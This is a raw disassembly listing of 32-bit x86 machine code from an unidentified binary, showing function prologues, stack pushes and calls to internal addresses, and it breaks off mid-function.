  401fc9:	e8 f2 ba 00 00       	call   0x40dac0
  401fce:	5a                   	pop    %edx
  401fcf:	50                   	push   %eax
  401fd0:	52                   	push   %edx
  401fd1:	e8 ea ba 00 00       	call   0x40dac0
  401fd6:	5a                   	pop    %edx
  401fd7:	50                   	push   %eax
  401fd8:	ff 74 24 18          	push   0x18(%esp)
  401fdc:	e8 1f 78 00 00       	call   0x409800
  401fe1:	8d 05 48 70 41 00    	lea    0x417048,%eax
  401fe7:	50                   	push   %eax
  401fe8:	e8 13 bb 00 00       	call   0x40db00
  401fed:	ff 35 48 70 41 00    	push   0x417048
  401ff3:	e8 cc 83 00 00       	call   0x40a3c4
  401ff8:	ff 35 48 70 41 00    	push   0x417048
  401ffe:	e8 02 83 00 00       	call   0x40a305
  402003:	ff 74 24 10          	push   0x10(%esp)
  402007:	68 00 00 00 00       	push   $0x0
  40200c:	b8 20 60 41 00       	mov    $0x416020,%eax
  402011:	50                   	push   %eax
  402012:	ff 35 48 70 41 00    	push   0x417048
  402018:	e8 a1 30 00 00       	call   0x4050be
  40201d:	52                   	push   %edx
  40201e:	e8 9d ba 00 00       	call   0x40dac0
  402023:	5a                   	pop    %edx
  402024:	50                   	push   %eax
  402025:	52                   	push   %edx
  402026:	e8 95 ba 00 00       	call   0x40dac0
  40202b:	5a                   	pop    %edx
  40202c:	50                   	push   %eax
  40202d:	ff 74 24 18          	push   0x18(%esp)
  402031:	e8 ca 77 00 00       	call   0x409800
  402036:	8d 05 60 70 41 00    	lea    0x417060,%eax
  40203c:	50                   	push   %eax
  40203d:	e8 be ba 00 00       	call   0x40db00
  402042:	ff 35 60 70 41 00    	push   0x417060
  402048:	e8 77 83 00 00       	call   0x40a3c4
  40204d:	ff 35 60 70 41 00    	push   0x417060
  402053:	e8 ad 82 00 00       	call   0x40a305
  402058:	ff 74 24 10          	push   0x10(%esp)
  40205c:	68 00 00 00 00       	push   $0x0
  402061:	b8 20 60 41 00       	mov    $0x416020,%eax
  402066:	50                   	push   %eax
  402067:	ff 35 60 70 41 00    	push   0x417060
  40206d:	e8 4c 30 00 00       	call   0x4050be
  402072:	ff 35 60 70 41 00    	push   0x417060
  402078:	e8 de 32 00 00       	call   0x40535b
  40207d:	52                   	push   %edx
  40207e:	e8 3d ba 00 00       	call   0x40dac0
  402083:	5a                   	pop    %edx
  402084:	50                   	push   %eax
  402085:	52                   	push   %edx
  402086:	e8 35 ba 00 00       	call   0x40dac0
  40208b:	5a                   	pop    %edx
  40208c:	50                   	push   %eax
  40208d:	ff 74 24 18          	push   0x18(%esp)
  402091:	e8 6a 77 00 00       	call   0x409800
  402096:	8d 05 40 70 41 00    	lea    0x417040,%eax
  40209c:	50                   	push   %eax
  40209d:	e8 5e ba 00 00       	call   0x40db00
  4020a2:	ff 35 40 70 41 00    	push   0x417040
  4020a8:	e8 17 83 00 00       	call   0x40a3c4
  4020ad:	ff 74 24 0c          	push   0xc(%esp)
  4020b1:	ff 35 40 70 41 00    	push   0x417040
  4020b7:	e8 a5 32 00 00       	call   0x405361
  4020bc:	ff 74 24 10          	push   0x10(%esp)
  4020c0:	e8 fb 76 00 00       	call   0x4097c0
  4020c5:	eb 02                	jmp    0x4020c9
  4020c7:	31 c0                	xor    %eax,%eax
  4020c9:	ff 74 24 0c          	push   0xc(%esp)
  4020cd:	e8 be ba 00 00       	call   0x40db90
  4020d2:	ff 74 24 14          	push   0x14(%esp)
  4020d6:	e8 b5 ba 00 00       	call   0x40db90
  4020db:	ff 74 24 08          	push   0x8(%esp)
  4020df:	e8 ac ba 00 00       	call   0x40db90
  4020e4:	83 c4 18             	add    $0x18,%esp
  4020e7:	5b                   	pop    %ebx
  4020e8:	c3                   	ret
  4020e9:	53                   	push   %ebx
  4020ea:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  4020ee:	83 c3 06             	add    $0x6,%ebx
  4020f1:	53                   	push   %ebx
  4020f2:	58                   	pop    %eax
  4020f3:	e8 08 30 00 00       	call   0x405100
  4020f8:	a3 38 70 41 00       	mov    %eax,0x417038
  4020fd:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  402101:	83 c3 08             	add    $0x8,%ebx
  402104:	53                   	push   %ebx
  402105:	58                   	pop    %eax
  402106:	e8 f5 2f 00 00       	call   0x405100
  40210b:	a3 08 70 41 00       	mov    %eax,0x417008
  402110:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  402114:	83 c3 0a             	add    $0xa,%ebx
  402117:	53                   	push   %ebx
  402118:	58                   	pop    %eax
  402119:	e8 e2 2f 00 00       	call   0x405100
  40211e:	a3 20 70 41 00       	mov    %eax,0x417020
  402123:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  402127:	83 c3 0c             	add    $0xc,%ebx
  40212a:	53                   	push   %ebx
  40212b:	58                   	pop    %eax
  40212c:	e8 cf 2f 00 00       	call   0x405100
  402131:	a3 58 70 41 00       	mov    %eax,0x417058
  402136:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  40213a:	83 c3 0e             	add    $0xe,%ebx
  40213d:	53                   	push   %ebx
  40213e:	58                   	pop    %eax
  40213f:	e8 bc 2f 00 00       	call   0x405100
  402144:	a3 4c 70 41 00       	mov    %eax,0x41704c
  402149:	31 c0                	xor    %eax,%eax
  40214b:	5b                   	pop    %ebx
  40214c:	c2 04 00             	ret    $0x4
  40214f:	31 c0                	xor    %eax,%eax
  402151:	50                   	push   %eax
  402152:	50                   	push   %eax
  402153:	50                   	push   %eax
  402154:	e8 a7 ba 00 00       	call   0x40dc00
  402159:	52                   	push   %edx
  40215a:	e8 61 b9 00 00       	call   0x40dac0
  40215f:	5a                   	pop    %edx
  402160:	50                   	push   %eax
  402161:	52                   	push   %edx
  402162:	e8 59 b9 00 00       	call   0x40dac0
  402167:	5a                   	pop    %edx
  402168:	50                   	push   %eax
  402169:	52                   	push   %edx
  40216a:	e8 51 b9 00 00       	call   0x40dac0
  40216f:	5a                   	pop    %edx
  402170:	50                   	push   %eax
  402171:	52                   	push   %edx
  402172:	e8 49 b9 00 00       	call   0x40dac0
  402177:	5a                   	pop    %edx
  402178:	50                   	push   %eax
  402179:	68 01 00 00 00       	push   $0x1
  40217e:	ff 35 1c 70 41 00    	push   0x41701c
  402184:	e8 b7 ab 00 00       	call   0x40cd40
  402189:	e8 f4 2f 00 00       	call   0x405182
  40218e:	01 14 24             	add    %edx,(%esp)
  402191:	e8 9a 3c 00 00       	call   0x405e30
  402196:	8d 44 24 04          	lea    0x4(%esp),%eax
  40219a:	50                   	push   %eax
  40219b:	e8 60 b9 00 00       	call   0x40db00
  4021a0:	52                   	push   %edx
  4021a1:	e8 1a b9 00 00       	call   0x40dac0
  4021a6:	5a                   	pop    %edx
  4021a7:	50                   	push   %eax
  4021a8:	52                   	push   %edx
  4021a9:	e8 12 b9 00 00       	call   0x40dac0
  4021ae:	5a                   	pop    %edx
  4021af:	50                   	push   %eax
  4021b0:	52                   	push   %edx
  4021b1:	e8 0a b9 00 00       	call   0x40dac0
  4021b6:	5a                   	pop    %edx
  4021b7:	50                   	push   %eax
  4021b8:	52                   	push   %edx
  4021b9:	e8 02 b9 00 00       	call   0x40dac0
  4021be:	5a                   	pop    %edx
  4021bf:	50                   	push   %eax
  4021c0:	68 03 00 00 00       	push   $0x3
  4021c5:	ff 35 1c 70 41 00    	push   0x41701c
  4021cb:	e8 70 ab 00 00       	call   0x40cd40
  4021d0:	e8 ad 2f 00 00       	call   0x405182
  4021d5:	01 14 24             	add    %edx,(%esp)
  4021d8:	e8 53 3c 00 00       	call   0x405e30
  4021dd:	8d 44 24 08          	lea    0x8(%esp),%eax
  4021e1:	50                   	push   %eax
  4021e2:	e8 19 b9 00 00       	call   0x40db00
  4021e7:	52                   	push   %edx
  4021e8:	e8 d3 b8 00 00       	call   0x40dac0
  4021ed:	5a                   	pop    %edx
  4021ee:	50                   	push   %eax
  4021ef:	ff 74 24 08          	push   0x8(%esp)
  4021f3:	e8 5d 10 00 00       	call   0x403255
  4021f8:	8d 05 50 70 41 00    	lea    0x417050,%eax
  4021fe:	50                   	push   %eax
  4021ff:	e8 fc b8 00 00       	call   0x40db00
  402204:	52                   	push   %edx
  402205:	e8 b6 b8 00 00       	call   0x40dac0
  40220a:	5a                   	pop    %edx
  40220b:	50                   	push   %eax
  40220c:	ff 74 24 04          	push   0x4(%esp)
  402210:	e8 40 10 00 00       	call   0x403255
  402215:	8d 44 24 0c          	lea    0xc(%esp),%eax
  402219:	50                   	push   %eax
  40221a:	e8 e1 b8 00 00       	call   0x40db00
  40221f:	ff 74 24 08          	push   0x8(%esp)
  402223:	ff 35 40 70 41 00    	push   0x417040
  402229:	e8 88 02 00 00       	call   0x4024b6
  40222e:	31 c0                	xor    %eax,%eax
  402230:	ff 74 24 04          	push   0x4(%esp)
  402234:	e8 57 b9 00 00       	call   0x40db90
  402239:	ff 34 24             	push   (%esp)
  40223c:	e8 4f b9 00 00       	call   0x40db90
  402241:	ff 74 24 08          	push   0x8(%esp)
  402245:	e8 46 b9 00 00       	call   0x40db90
  40224a:	83 c4 0c             	add    $0xc,%esp
  40224d:	c3                   	ret
  40224e:	53                   	push   %ebx
  40224f:	31 c0                	xor    %eax,%eax
  402251:	50                   	push   %eax
  402252:	50                   	push   %eax
  402253:	50                   	push   %eax
  402254:	50                   	push   %eax
  402255:	e8 a6 b9 00 00       	call   0x40dc00
  40225a:	ff 74 24 1c          	push   0x1c(%esp)
  40225e:	e8 3d 2f 00 00       	call   0x4051a0
  402263:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  402267:	83 c3 02             	add    $0x2,%ebx
  40226a:	53                   	push   %ebx
  40226b:	58                   	pop    %eax
  40226c:	e8 8f 2e 00 00       	call   0x405100
  402271:	89 c3                	mov    %eax,%ebx
  402273:	83 fb 01             	cmp    $0x1,%ebx
  402276:	0f 85 e8 01 00 00    	jne    0x402464
  40227c:	52                   	push   %edx
  40227d:	e8 3e b8 00 00       	call   0x40dac0
  402282:	5a                   	pop    %edx
  402283:	50                   	push   %eax
  402284:	52                   	push   %edx
  402285:	e8 36 b8 00 00       	call   0x40dac0
  40228a:	5a                   	pop    %edx
  40228b:	50                   	push   %eax
  40228c:	52                   	push   %edx
  40228d:	e8 2e b8 00 00       	call   0x40dac0
  402292:	5a                   	pop    %edx
  402293:	50                   	push   %eax
  402294:	52                   	push   %edx
  402295:	e8 26 b8 00 00       	call   0x40dac0
  40229a:	5a                   	pop    %edx
  40229b:	50                   	push   %eax
  40229c:	68 28 00 00 00       	push   $0x28
  4022a1:	8b 5c 24 2c          	mov    0x2c(%esp),%ebx
  4022a5:	83 c3 40             	add    $0x40,%ebx
  4022a8:	53                   	push   %ebx
  4022a9:	e8 a2 75 00 00       	call   0x409850
  4022ae:	e8 cf 2e 00 00       	call   0x405182
  4022b3:	01 14 24             	add    %edx,(%esp)
  4022b6:	e8 45 3d 00 00       	call   0x406000
  4022bb:	8d 44 24 04          	lea    0x4(%esp),%eax
  4022bf:	50                   	push   %eax
  4022c0:	e8 3b b8 00 00       	call   0x40db00
  4022c5:	52                   	push   %edx
  4022c6:	e8 f5 b7 00 00       	call   0x40dac0
  4022cb:	5a                   	pop    %edx
  4022cc:	50                   	push   %eax
  4022cd:	52                   	push   %edx
  4022ce:	e8 ed b7 00 00       	call   0x40dac0
  4022d3:	5a                   	pop    %edx
  4022d4:	50                   	push   %eax
  4022d5:	52                   	push   %edx
  4022d6:	e8 e5 b7 00 00       	call   0x40dac0
  4022db:	5a                   	pop    %edx
  4022dc:	50                   	push   %eax
  4022dd:	52                   	push   %edx
  4022de:	e8 dd b7 00 00       	call   0x40dac0
  4022e3:	5a                   	pop    %edx
  4022e4:	50                   	push   %eax
  4022e5:	68 64 00 00 00       	push   $0x64
  4022ea:	8b 5c 24 2c          	mov    0x2c(%esp),%ebx
  4022ee:	81 c3 2c 01 00 00    	add    $0x12c,%ebx
  4022f4:	53                   	push   %ebx
  4022f5:	e8 56 75 00 00       	call   0x409850
  4022fa:	e8 83 2e 00 00       	call   0x405182
  4022ff:	01 14 24             	add    %edx,(%esp)
  402302:	e8 f9 3c 00 00       	call   0x406000
  402307:	8d 44 24 08          	lea    0x8(%esp),%eax
  40230b:	50                   	push   %eax
  40230c:	e8 ef b7 00 00       	call   0x40db00
  402311:	52                   	push   %edx
  402312:	e8 a9 b7 00 00       	call   0x40dac0
  402317:	5a                   	pop    %edx
  402318:	50                   	push   %eax
  402319:	52                   	push   %edx
  40231a:	e8 a1 b7 00 00       	call   0x40dac0
  40231f:	5a                   	pop    %edx
  402320:	50                   	push   %eax
  402321:	68 01 00 00 00       	push   $0x1
  402326:	b8 20 60 41 00       	mov    $0x416020,%eax
  40232b:	50                   	push   %eax
  40232c:	52                   	push   %edx
  40232d:	e8 8e b7 00 00       	call   0x40dac0
  402332:	5a                   	pop    %edx
  402333:	50                   	push   %eax
  402334:	52                   	push   %edx
  402335:	e8 86 b7 00 00       	call   0x40dac0
  40233a:	5a                   	pop    %edx
  40233b:	50                   	push   %eax
  40233c:	ff 35 f8 6f 41 00    	push   0x416ff8
  402342:	68 02 00 00 00       	push   $0x2
  402347:	ff 74 24 24          	push   0x24(%esp)
  40234b:	e8 a0 34 00 00       	call   0x4057f0
  402350:	e8 6b b9 00 00       	call   0x40dcc0
  402355:	52                   	push   %edx
  402356:	e8 65 b7 00 00       	call   0x40dac0
  40235b:	5a                   	pop    %edx
  40235c:	50                   	push   %eax
  40235d:	52                   	push   %edx
  40235e:	e8 5d b7 00 00       	call   0x40dac0
  402363:	5a                   	pop    %edx
  402364:	50                   	push   %eax
  402365:	ff 35 f8 6f 41 00    	push   0x416ff8
  40236b:	68 01 00 00 00       	push   $0x1
  402370:	ff 74 24 28          	push   0x28(%esp)
  402374:	e8 77 34 00 00       	call   0x4057f0
  402379:	e8 04 2e 00 00       	call   0x405182
  40237e:	01 14 24             	add    %edx,(%esp)
  402381:	e8 fc 2d 00 00       	call   0x405182
  402386:	01 54 24 04          	add    %edx,0x4(%esp)
  40238a:	e8 1a 68 00 00       	call   0x408ba9
  40238f:	8d 44 24 0c          	lea    0xc(%esp),%eax
  402393:	50                   	push   %eax
  402394:	e8 67 b7 00 00       	call   0x40db00
  402399:	8b 54 24 08          	mov    0x8(%esp),%edx
  40239d:	31 c9                	xor    %ecx,%ecx
  40239f:	e8 7c 2d 00 00       	call   0x405120
  4023a4:	0f 85 b0 00 00 00    	jne    0x40245a
  4023aa:	52                   	push   %edx
  4023ab:	e8 10 b7 00 00       	call   0x40dac0
  4023b0:	5a                   	pop    %edx
  4023b1:	50                   	push   %eax
  4023b2:	52                   	push   %edx
  4023b3:	e8 08 b7 00 00       	call   0x40dac0
  4023b8:	5a                   	pop    %edx
  4023b9:	50                   	push   %eax
  4023ba:	68 01 00 00 00       	push   $0x1
  4023bf:	52                   	push   %edx
  4023c0:	e8 fb b6 00 00       	call   0x40dac0
  4023c5:	5a                   	pop    %edx
  4023c6:	50                   	push   %eax
  4023c7:	52                   	push   %edx
  4023c8:	e8 f3 b6 00 00       	call   0x40dac0
  4023cd:	5a                   	pop    %edx
  4023ce:	50                   	push   %eax
  4023cf:	ff 74 24 1c          	push   0x1c(%esp)
  4023d3:	e8 28 3c 00 00       	call   0x406000
  4023d8:	e8 a5 2d 00 00       	call   0x405182
  4023dd:	01 14 24             	add    %edx,(%esp)
  4023e0:	e8 5b a9 00 00       	call   0x40cd40
  4023e5:	8d 44 24 10          	lea    0x10(%esp),%eax
  4023e9:	50                   	push   %eax
  4023ea:	e8 11 b7 00 00       	call   0x40db00
  4023ef:	ff 74 24 0c          	push   0xc(%esp)
  4023f3:	8b 54 24 04          	mov    0x4(%esp),%edx
  4023f7:	59                   	pop    %ecx
  4023f8:	e8 23 2d 00 00       	call   0x405120
  4023fd:	75 59                	jne    0x402458
  4023ff:	52                   	push   %edx
  402400:	e8 bb b6 00 00       	call   0x40dac0
  402405:	5a                   	pop    %edx
  402406:	50                   	push   %eax
  402407:	68 10 00 00 00       	push   $0x10
  40240c:	52                   	push   %edx
  40240d:	e8 ae b6 00 00       	call   0x40dac0
  402412:	5a                   	pop    %edx
  402413:	50                   	push   %eax
  402414:	52                   	push   %edx
  402415:	e8 a6 b6 00 00       	call   0x40dac0
  40241a:	5a                   	pop    %edx
  40241b:	50                   	push   %eax
  40241c:	ff 35 f8 6f 41 00    	push   0x416ff8
  402422:	68 03 00 00 00       	push   $0x3
  402427:	ff 74 24 1c          	push   0x1c(%esp)
  40242b:	e8 c0 33 00 00       	call   0x4057f0
  402430:	e8 8b b8 00 00       	call   0x40dcc0
  402435:	ff 35 34 70 41 00    	push   0x417034
  40243b:	e8 42 2d 00 00       	call   0x405182
  402440:	01 54 24 04          	add    %edx,0x4(%esp)
  402444:	e8 1e 66 00 00       	call   0x408a67
  402449:	e8 52 2d 00 00       	call   0x4051a0
  40244e:	68 00 00 00 00       	push   $0x0
  402453:	e8 9e f8 ff ff       	call   0x401cf6
  402458:	eb 0a                	jmp    0x402464
  40245a:	68 00 00 00 00       	push   $0x0
  40245f:	e8 92 f8 ff ff       	call   0x401cf6
  402464:	8b 54 24 0c          	mov    0xc(%esp),%edx
  402468:	52                   	push   %edx
  402469:	e8 52 b6 00 00       	call   0x40dac0
  40246e:	5a                   	pop    %edx
  40246f:	50                   	push   %eax
  402470:	52                   	push   %edx
  402471:	e8 ea b7 00 00       	call   0x40dc60
  402476:	58                   	pop    %eax
  402477:	50                   	push   %eax
  402478:	e8 f3 2c 00 00       	call   0x405170
  40247d:	5a                   	pop    %edx
  40247e:	01 d0                	add    %edx,%eax
  402480:	eb 0a                	jmp    0x40248c
  402482:	e8 69 b8 00 00       	call   0x40dcf0
  402487:	66 c7 00 00 00       	movw   $0x0,(%eax)
  40248c:	ff 74 24 04          	push   0x4(%esp)
  402490:	e8 fb b6 00 00       	call   0x40db90
  402495:	ff 74 24 08          	push   0x8(%esp)
  402499:	e8 f2 b6 00 00       	call   0x40db90
  40249e:	ff 34 24             	push   (%esp)
  4024a1:	e8 ea b6 00 00       	call   0x40db90
  4024a6:	ff 74 24 0c          	push   0xc(%esp)
  4024aa:	e8 e1 b6 00 00       	call   0x40db90
  4024af:	83 c4 10             	add    $0x10,%esp
  4024b2:	5b                   	pop    %ebx
  4024b3:	c2 04 00             	ret    $0x4
  4024b6:	53                   	push   %ebx
  4024b7:	31 c0                	xor    %eax,%eax
  4024b9:	50                   	push   %eax
  4024ba:	50                   	push   %eax
  4024bb:	50                   	push   %eax
  4024bc:	50                   	push   %eax
  4024bd:	8b 54 24 18          	mov    0x18(%esp),%edx
  4024c1:	8d 0c 24             	lea    (%esp),%ecx
  4024c4:	e8 97 2b 00 00       	call   0x405060
  4024c9:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  4024cd:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  4024d1:	e8 8a 2b 00 00       	call   0x405060
  4024d6:	68 19 00 00 00       	push   $0x19
  4024db:	ff 74 24 04          	push   0x4(%esp)
  4024df:	68 ff ff ff ff       	push   $0xffffffff
  4024e4:	e8 07 84 00 00       	call   0x40a8f0
  4024e9:	89 44 24 08          	mov    %eax,0x8(%esp)
  4024ed:	83 7c 24 08 00       	cmpl   $0x0,0x8(%esp)
  4024f2:	74 1a                	je     0x40250e
  4024f4:	ff 74 24 04          	push   0x4(%esp)
  4024f8:	ff 74 24 0c          	push   0xc(%esp)
  4024fc:	e8 bf 86 00 00       	call   0x40abc0
  402501:	89 44 24 0c          	mov    %eax,0xc(%esp)
  402505:	ff 74 24 08          	push   0x8(%esp)
  402509:	e8 02 81 00 00       	call   0x40a610
  40250e:	ff 74 24 04          	push   0x4(%esp)
  402512:	e8 49 38 00 00       	call   0x405d60
  402517:	89 c3                	mov    %eax,%ebx
  402519:	21 db                	and    %ebx,%ebx
  40251b:	75 08                	jne    0x402525
  40251d:	c7 44 24 0c 01 00 00 	movl   $0x1,0xc(%esp)
  402524:	00 
  402525:	8b 44 24 0c          	mov    0xc(%esp),%eax
  402529:	eb 02                	jmp    0x40252d
  40252b:	31 c0                	xor    %eax,%eax
  40252d:	ff 34 24             	push   (%esp)
  402530:	e8 5b b6 00 00       	call   0x40db90
  402535:	ff 74 24 04          	push   0x4(%esp)
  402539:	e8 52 b6 00 00       	call   0x40db90
  40253e:	83 c4 10             	add    $0x10,%esp
  402541:	5b                   	pop    %ebx
  402542:	c2 08 00             	ret    $0x8
  402545:	31 c0                	xor    %eax,%eax
  402547:	50                   	push   %eax
  402548:	50                   	push   %eax
  402549:	50                   	push   %eax
  40254a:	8b 54 24 10          	mov    0x10(%esp),%edx
  40254e:	8d 0c 24             	lea    (%esp),%ecx
  402551:	e8 0a 2b 00 00       	call   0x405060
  402556:	68 00 00 02 00       	push   $0x20000
  40255b:	ff 74 24 04          	push   0x4(%esp)
  40255f:	68 ff ff ff ff       	push   $0xffffffff
  402564:	e8 77 84 00 00       	call   0x40a9e0
  402569:	89 44 24 04          	mov    %eax,0x4(%esp)
  40256d:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  402572:	74 11                	je     0x402585
  402574:	ff 74 24 04          	push   0x4(%esp)
  402578:	e8 93 80 00 00       	call   0x40a610
  40257d:	c7 44 24 08 01 00 00 	movl   $0x1,0x8(%esp)
  402584:	00 
  402585:	8b 44 24 08          	mov    0x8(%esp),%eax
  402589:	eb 02                	jmp    0x40258d
  40258b:	31 c0                	xor    %eax,%eax
  40258d:	ff 34 24             	push   (%esp)
  402590:	e8 fb b5 00 00       	call   0x40db90
  402595:	83 c4 0c             	add    $0xc,%esp
  402598:	c2 04 00             	ret    $0x4
  40259b:	53                   	push   %ebx
  40259c:	ba 09 00 00 00       	mov    $0x9,%edx
  4025a1:	83 ec 04             	sub    $0x4,%esp
  4025a4:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4025ab:	4a                   	dec    %edx
  4025ac:	75 f3                	jne    0x4025a1
  4025ae:	e8 4d b6 00 00       	call   0x40dc00
  4025b3:	ff 74 24 2c          	push   0x2c(%esp)
  4025b7:	e8 e4 2b 00 00       	call   0x4051a0
  4025bc:	b8 c3 60 41 00       	mov    $0x4160c3,%eax
  4025c1:	a3 0c 70 41 00       	mov    %eax,0x41700c
  4025c6:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4025cd:	eb 00                	jmp    0x4025cf
  4025cf:	b8 06 00 00 00       	mov    $0x6,%eax
  4025d4:	3b 04 24             	cmp    (%esp),%eax
  4025d7:	7c 64                	jl     0x40263d
  4025d9:	a1 0c 70 41 00       	mov    0x41700c,%eax
  4025de:	0f be 00             	movsbl (%eax),%eax
  4025e1:	89 44 24 04          	mov    %eax,0x4(%esp)
  4025e5:	ff 05 0c 70 41 00    	incl   0x41700c
  4025eb:	52                   	push   %edx
  4025ec:	e8 cf b4 00 00       	call   0x40dac0
  4025f1:	5a                   	pop    %edx
  4025f2:	50                   	push   %eax
  4025f3:	52                   	push   %edx
  4025f4:	e8 c7 b4 00 00       	call   0x40dac0
  4025f9:	5a                   	pop    %edx
  4025fa:	50                   	push   %eax
  4025fb:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  4025ff:	6b db ff             	imul   $0xffffffff,%ebx,%ebx
  402602:	53                   	push   %ebx
  402603:	e8 08 39 00 00       	call   0x405f10
  402608:	8d 44 24 0c          	lea    0xc(%esp),%eax
  40260c:	50                   	push   %eax
  40260d:	e8 ee b4 00 00       	call   0x40db00
  402612:	8b 54 24 0c          	mov    0xc(%esp),%edx
  402616:	52                   	push   %edx
  402617:	e8 a4 b4 00 00       	call   0x40dac0
  40261c:	5a                   	pop    %edx
  40261d:	50                   	push   %eax
  40261e:	52                   	push   %edx
  40261f:	e8 3c b6 00 00       	call   0x40dc60
  402624:	8b 54 24 0c          	mov    0xc(%esp),%edx
  402628:	52                   	push   %edx
  402629:	e8 32 b6 00 00       	call   0x40dc60
  40262e:	8d 44 24 10          	lea    0x10(%esp),%eax
  402632:	50                   	push   %eax
  402633:	e8 c8 b4 00 00       	call   0x40db00
  402638:	ff 04 24             	incl   (%esp)
  40263b:	71 92                	jno    0x4025cf
  40263d:	52                   	push   %edx
  40263e:	e8 7d b4 00 00       	call   0x40dac0
  402643:	5a                   	pop    %edx
  402644:	50                   	push   %eax
  402645:	52                   	push   %edx
  402646:	e8 75 b4 00 00       	call   0x40dac0
  40264b:	5a                   	pop    %edx
  40264c:	50                   	push   %eax
  40264d:	e8 72 2a 00 00       	call   0x4050c4
  402652:	50                   	push   %eax
  402653:	e8 a8 71 00 00       	call   0x409800
  402658:	8d 44 24 14          	lea    0x14(%esp),%eax
  40265c:	50                   	push   %eax
  40265d:	e8 9e b4 00 00       	call   0x40db00
  402662:	8b 54 24 10          	mov    0x10(%esp),%edx
  402666:	52                   	push   %edx
  402667:	e8 54 b4 00 00       	call   0x40dac0
  40266c:	5a                   	pop    %edx
  40266d:	50                   	push   %eax
  40266e:	52                   	push   %edx
  40266f:	e8 ec b5 00 00       	call   0x40dc60
  402674:	8d 44 24 18          	lea    0x18(%esp),%eax
  402678:	50                   	push   %eax
  402679:	e8 82 b4 00 00       	call   0x40db00
  40267e:	8b 44 24 14          	mov    0x14(%esp),%eax
  402682:	50                   	push   %eax
  402683:	e8 df 2c 00 00       	call   0x405367
  402688:	89 44 24 18          	mov    %eax,0x18(%esp)
  40268c:	ff 74 24 14          	push   0x14(%esp)
  402690:	e8 cb 36 00 00       	call   0x405d60
  402695:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  402699:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  40269d:	21 db                	and    %ebx,%ebx
  40269f:	7e 5a                	jle    0x4026fb
  4026a1:	52                   	push   %edx
  4026a2:	e8 19 b4 00 00       	call   0x40dac0
  4026a7:	5a                   	pop    %edx
  4026a8:	50                   	push   %eax
  4026a9:	ba 26 60 41 00       	mov    $0x416026,%edx
  4026ae:	52                   	push   %edx
  4026af:	e8 ac b5 00 00       	call   0x40dc60
  4026b4:	52                   	push   %edx
  4026b5:	e8 06 b4 00 00       	call   0x40dac0
  4026ba:	5a                   	pop    %edx
  4026bb:	50                   	push   %eax
  4026bc:	52                   	push   %edx
  4026bd:	e8 fe b3 00 00       	call   0x40dac0
  4026c2:	5a                   	pop    %edx
  4026c3:	50                   	push   %eax
  4026c4:	52                   	push   %edx
  4026c5:	e8 f6 b3 00 00       	call   0x40dac0
  4026ca:	5a                   	pop    %edx
  4026cb:	50                   	push   %eax
  4026cc:	52                   	push   %edx
  4026cd:	e8 ee b3 00 00       	call   0x40dac0
  4026d2:	5a                   	pop    %edx
  4026d3:	50                   	push   %eax
  4026d4:	8b 5c 24 30          	mov    0x30(%esp),%ebx
  4026d8:	43                   	inc    %ebx
  4026d9:	53                   	push   %ebx
  4026da:	ff 74 24 28          	push   0x28(%esp)
  4026de:	e8 cd 39 00 00       	call   0x4060b0
  4026e3:	e8 9a 2a 00 00       	call   0x405182
  4026e8:	01 14 24             	add    %edx,(%esp)
  4026eb:	e8 10 39 00 00       	call   0x406000
  4026f0:	58                   	pop    %eax
  4026f1:	8d 44 24 24          	lea    0x24(%esp),%eax
  4026f5:	50                   	push   %eax
  4026f6:	e8 05 b4 00 00       	call   0x40db00
  4026fb:	ff 74 24 20          	push   0x20(%esp)
  4026ff:	ff 74 24 10          	push   0x10(%esp)
  402703:	e8 f8 6d 00 00       	call   0x409500
  402708:	8b 54 24 20          	mov    0x20(%esp),%edx
  40270c:	52                   	push   %edx
  40270d:	e8 ae b3 00 00       	call   0x40dac0
  402712:	5a                   	pop    %edx
  402713:	50                   	push   %eax
  402714:	52                   	push   %edx
  402715:	e8 46 b5 00 00       	call   0x40dc60
  40271a:	58                   	pop    %eax
  40271b:	50                   	push   %eax
  40271c:	e8 4f 2a 00 00       	call   0x405170
  402721:	5a                   	pop    %edx
  402722:	01 d0                	add    %edx,%eax
  402724:	eb 0a                	jmp    0x402730
  402726:	e8 c5 b5 00 00       	call   0x40dcf0
  40272b:	66 c7 00 00 00       	movw   $0x0,(%eax)
  402730:	ff 74 24 14          	push   0x14(%esp)
  402734:	e8 57 b4 00 00       	call   0x40db90
  402739:	ff 74 24 08          	push   0x8(%esp)
  40273d:	e8 4e b4 00 00       	call   0x40db90
  402742:	ff 74 24 10          	push   0x10(%esp)
  402746:	e8 45 b4 00 00       	call   0x40db90
  40274b:	ff 74 24 0c          	push   0xc(%esp)
  40274f:	e8 3c b4 00 00       	call   0x40db90
  402754:	ff 74 24 20          	push   0x20(%esp)
  402758:	e8 33 b4 00 00       	call   0x40db90
  40275d:	83 c4 24             	add    $0x24,%esp
  402760:	5b                   	pop    %ebx
  402761:	c3                   	ret
  402762:	31 c0                	xor    %eax,%eax
  402764:	50                   	push   %eax
  402765:	50                   	push   %eax
  402766:	e8 95 b4 00 00       	call   0x40dc00
  40276b:	ff 74 24 10          	push   0x10(%esp)
  40276f:	ff 74 24 10          	push   0x10(%esp)
  402773:	e8 52 29 00 00       	call   0x4050ca
  402778:	89 04 24             	mov    %eax,(%esp)
  40277b:	ff 74 24 10          	push   0x10(%esp)
  40277f:	ff 74 24 10          	push   0x10(%esp)
  402783:	e8 48 29 00 00       	call   0x4050d0
  402788:	a3 fc 6f 41 00       	mov    %eax,0x416ffc
  40278d:	ff 35 fc 6f 41 00    	push   0x416ffc
  402793:	e8 48 70 00 00       	call   0x4097e0
  402798:	89 44 24 04          	mov    %eax,0x4(%esp)
  40279c:	ff 35 fc 6f 41 00    	push   0x416ffc
  4027a2:	ff 74 24 08          	push   0x8(%esp)
  4027a6:	ff 74 24 08          	push   0x8(%esp)
  4027aa:	e8 11 71 00 00       	call   0x4098c0
